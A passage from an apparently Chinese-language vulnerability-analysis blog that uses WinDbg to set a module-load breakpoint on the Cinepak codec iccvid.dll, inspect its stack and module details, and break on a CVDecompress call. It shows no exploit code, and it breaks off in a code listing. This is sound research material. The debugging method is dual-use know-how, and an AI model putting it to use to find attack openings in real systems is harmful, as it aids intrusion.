ld:ModuleName</code>命令，可以在<code>首次</code>加载<code>iccvid.dll</code>时断下，然后可以对地址<code>0x73b7cbee</code>下断点。此方法的不方便之处在于每次<code>重新附加程序</code>都需要<code>重新设置断点</code>，很麻烦(可能我没找到好的解决办法)。</li></ul></blockquote><p>&emsp;&emsp;这里我们使用<code>第2种方法</code>，在使用<code>sxe ld:ModuleName</code>命令后，会中断在<code>iccvid.dll</code>加载后调用的<code>ntdll!KiFastSystemCallRet</code>函数处。<code>sxe命令</code>的功能为，当<code>发生异常</code>时，<code>目标程序</code>将在其他任何<code>异常处理程序</code>被激活之前立即中断并进入<code>调试器</code>，这种处理称为<code>处理异常的第一次机会</code>。<code>ld[:Module]</code>，如果<code>指定Module</code>，则在加载具有<code>该名称的模块</code>时会发生中断。如果<code>省略Module</code>，则在加载<code>任何模块</code>时触发事件。中断后，通过kb查看<code>栈回溯</code>，可以知道<code>中断指令所在函数</code>的<code>函数调用链</code>。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">(a1c<span class="meta">.630</span>): Break instruction exception - code <span class="number">80000003</span> (first chance)</span><br><span class="line"><span class="built_in">eax</span>=7ffde000 <span class="built_in">ebx</span>=<span class="number">00000001</span> <span class="built_in">ecx</span>=<span class="number">00000002</span> <span class="built_in">edx</span>=<span class="number">00000003</span> <span class="built_in">esi</span>=<span class="number">00000004</span> <span class="built_in">edi</span>=<span class="number">00000005</span></span><br><span class="line"><span class="built_in">eip</span>=7c92120e <span class="built_in">esp</span>=01b6ffcc <span class="built_in">ebp</span>=01b6fff4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=<span class="number">0038</span>  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!DbgBreakPoint:</span><br><span class="line">7c92120e cc              <span class="keyword">int</span>     <span class="number">3</span></span><br><span class="line"><span class="number">0</span>:<span class="number">008</span>&gt; sxe ld:iccvid                                                            <span class="comment">; 在加载iccvid.dll时中断</span></span><br><span class="line"><span class="number">0</span>:<span class="number">008</span>&gt; g</span><br><span class="line"><span class="symbol">ModLoad:</span> 73b70000 73b87000   C:\WINDOWS\system32\iccvid.dll</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=<span class="number">00000044</span> <span class="built_in">edx</span>=00092ee0 <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92e4f4 <span class="built_in">esp</span>=01f6e298 <span class="built_in">ebp</span>=01f6e38c iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!KiFastSystemCallRet:</span><br><span class="line">7c92e4f4 c3              <span class="keyword">ret</span></span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">01c8e294 7c92d50c 7c93bd03 000004ac ffffffff ntdll!KiFastSystemCallRet</span><br><span class="line">01c8e298 7c93bd03 000004ac ffffffff 01c8e370 ntdll!ZwMapViewOfSection+<span class="number">0xc</span></span><br><span class="line">01c8e38c 7c93624a 00093cb8 01c8e418 01c8e940 ntdll!LdrpMapDll+<span class="number">0x330</span></span><br><span class="line">01c8e64c 7c9364b3 <span class="number">00000000</span> 00093cb8 01c8e940 ntdll!LdrpLoadDll+<span class="number">0x1e9</span></span><br><span class="line">01c8e8f4 7c801bbd 00093cb8 01c8e940 01c8e920 ntdll!LdrLoadDll+<span class="number">0x230</span></span><br><span class="line"><span class="symbol">WARNING:</span> Stack unwind information <span class="keyword">not</span> available. Following frames may be wrong.</span><br><span class="line">01c8e95c 7c80aefc 01c8e988 <span class="number">00000000</span> <span class="number">00000000</span> kernel32!LoadLibraryExW+<span class="number">0xc8</span></span><br><span class="line">01c8e970 76b13384 01c8e988 7c9210e0 76b30160 kernel32!LoadLibraryW+<span class="number">0x11</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0</span>:<span class="number">010</span>&gt; lm v m iccvid</span><br><span class="line">start    end        module name</span><br><span class="line">73b70000 73b87000   iccvid     (deferred)                                       <span class="comment">; iccvid.dll加载基址</span></span><br><span class="line">    Image path: C:\WINDOWS\system32\iccvid.dll</span><br><span class="line">    Image name: iccvid.dll</span><br><span class="line"><span class="symbol">    Timestamp:</span>        Mon Apr <span class="number">14</span> <span class="number">10</span>:<span class="number">12</span>:<span class="number">25</span> <span class="number">2008</span> (4802BD89)</span><br><span class="line"><span class="symbol">    CheckSum:</span>         000219FF</span><br><span class="line"><span class="symbol">    ImageSize:</span>        <span class="number">00017000</span></span><br><span class="line">    File version:     <span class="number">1.10</span><span class="meta">.0</span><span class="meta">.12</span></span><br><span class="line">    Product version:  <span class="number">1.10</span><span class="meta">.0</span><span class="meta">.0</span></span><br><span class="line">    File flags:       <span class="number">0</span> (Mask 3F)</span><br><span class="line">    File OS:          <span class="number">40004</span> NT Win32</span><br><span class="line">    File type:        <span class="number">3.8</span> Driver</span><br><span class="line">    File date:        <span class="number">00000000.00000000</span></span><br><span class="line"><span class="symbol">    Translations:</span>     <span class="number">0409.04e4</span></span><br><span class="line"><span class="symbol">    CompanyName:</span>      Radius <span class="keyword">Inc</span>.</span><br><span class="line"><span class="symbol">    ProductName:</span>      Cinepak for Windows <span class="number">32</span></span><br><span class="line"><span class="symbol">    InternalName:</span>     iccvid</span><br><span class="line"><span class="symbol">    OriginalFilename:</span> iccvid.drv</span><br><span class="line"><span class="symbol">    ProductVersion:</span>   <span class="number">1.10</span><span class="meta">.0</span><span class="meta">.0</span></span><br><span class="line"><span class="symbol">    FileVersion:</span>      <span class="number">1.10</span><span class="meta">.0</span><span class="meta">.11</span></span><br><span class="line"><span class="symbol">    FileDescription:</span>  Cinepak® Codec</span><br><span class="line"><span class="symbol">    LegalCopyright:</span>   Copyright © <span class="number">1992</span>-<span class="number">1995</span> Radius <span class="keyword">Inc</span>., All Rights Reserved</span><br><span class="line"><span class="symbol">    LegalTrademarks:</span>  Cinepak® is a trademark of Radius <span class="keyword">Inc</span>.</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;通过<code>“lm v m iccvid”</code>命令，我们可以看到<code>iccvid.dll</code>已经<code>被加载</code>，这时可以对位于地址<code>0x73b7cbee</code>处的调用<code>CVDecompress函数</code>的指令下断点，然后观察传入<code>CVDecompress函数</code>的参数，以及分析<code>函数功能</code>，分析结果如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span 